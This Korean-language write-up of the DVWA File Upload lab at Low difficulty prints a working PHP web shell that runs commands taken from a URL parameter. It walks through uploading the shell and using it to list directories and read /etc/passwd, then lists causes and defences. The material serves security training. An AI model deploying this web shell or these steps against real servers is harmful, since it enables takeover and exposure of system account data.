# File Upload 취약점

- **File Upload 취약점은 서버가 업로드되는 파일의 종류와 실행 여부를 제대로 검증하지 않아, 공격자가 의도한 파일을 업로드하고 이를 통해 시스템을 제어할 수 있게 되는 웹 취약점입니다.**

---

## 실습 대상

- 다음은 DVWA의 File Upload 실습 화면입니다.
- 사용자는 파일을 선택해 서버로 업로드할 수 있습니다.

![01](/Low/File%20Upload/imgs/01.png)

---

## 취약점 개요

- 파일 업로드 취약점에서 가장 대표적이고 치명적인 공격 방식은 **웹쉘(Web Shell)** 업로드입니다.
- 웹쉘은 서버에 업로드되어 **웹을 통해 명령을 실행할 수 있는 스크립트 파일**을 의미합니다.

---

## 웹쉘 파일 생성

- 웹쉘 파일을 작성하기 위해 터미널에서 Desktop 디렉터리로 이동한 뒤 `webshell.php` 파일을 생성합니다.

![02](/Low/File%20Upload/imgs/02.png)

- 작성한 웹쉘 코드는 다음과 같습니다.
```text
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd'] . ' 2>&1');
        }
    ?>
    </pre>
    </body>
    </html>
```
![03](/Low/File%20Upload/imgs/03.png)

- 파일이 정상적으로 작성되었는지 확인합니다.

![04](/Low/File%20Upload/imgs/04.png)

---

## 파일 업로드 수행

- 파일 업로드 페이지로 이동한 뒤, 방금 생성한 `webshell.php` 파일을 업로드합니다.

![05](/Low/File%20Upload/imgs/05.png)

- 업로드가 완료되면 다음과 같이 **업로드 성공 메시지와 함께 업로드된 경로가 그대로 노출**됩니다.

![06](/Low/File%20Upload/imgs/06.png)

- 이 과정에서 공격자는 다음 정보를 획득할 수 있습니다.
  - 업로드 파일이 저장되는 실제 디렉터리
  - 웹을 통해 접근 가능한 경로 구조

---

## 업로드 파일 접근 확인

- 안내된 경로를 URL에 직접 입력해 업로드된 파일에 접근합니다.
```text
http://192.168.64.14/DVWA/vulnerabilities/upload/../../hackable/uploads/webshell.php
```

![07](/Low/File%20Upload/imgs/07.png)

- 접근 결과, 웹쉘 코드에 포함된 HTML 폼이 실행되어 명령을 입력할 수 있는 화면이 출력됩니다.

![08](/Low/File%20Upload/imgs/08.png)

---

## 명령 실행 확인

- 웹쉘이 정상적으로 동작하는지 확인하기 위해 현재 위치를 출력합니다.
- 현재 위치는 `/var/www/html/DVWA/hackable/uploads`임을 확인할 수 있습니다.

![09](/Low/File%20Upload/imgs/09.png)

- 다음으로 최상위 루트 디렉터리로 이동한 뒤, 파일 및 디렉터리 목록을 확인합니다.

![10](/Low/File%20Upload/imgs/10.png)

---

## 시스템 파일 접근

- 웹쉘을 이용해 시스템 계정 정보를 확인하기 위해 `/etc/passwd` 파일을 출력합니다.
- 루트 디렉터리로 이동하기 위해 `../`를 6번 이상 사용합니다. 이유는 루트 디렉토리로 올라가기 위해서는 최대 6번은 상위로 올라가야 root디렉토리로 도달할 수 있기 때문입니다.

- 사용한 페이로드는 다음과 같습니다.
```text
cat ../../../../../../etc/passwd
```
- 그 결과, 시스템 내 사용자 계정 정보가 노출된 것을 확인할 수 있습니다.

![11](/Low/File%20Upload/imgs/11.png)

---

## 취약점 발생 원인

- 업로드 파일에 대한 확장자 검증 미흡
- 업로드 파일 내용 검증 부재
- 업로드 디렉터리 내 스크립트 실행 허용

---

## 악용할 경우 가능한 공격

- 시스템 정보 수집 및 내부 파일 접근
- 권한 상승
- 서버 장악 및 서비스 훼손

---

## File Upload 취약점 예방법

- 업로드 파일 확장자 화이트리스트 적용
- 업로드 디렉터리를 웹 루트 외부로 분리
- 업로드 디렉터리 내 스크립트 실행 차단
- 업로드 결과 메시지에 경로 정보 노출 금지
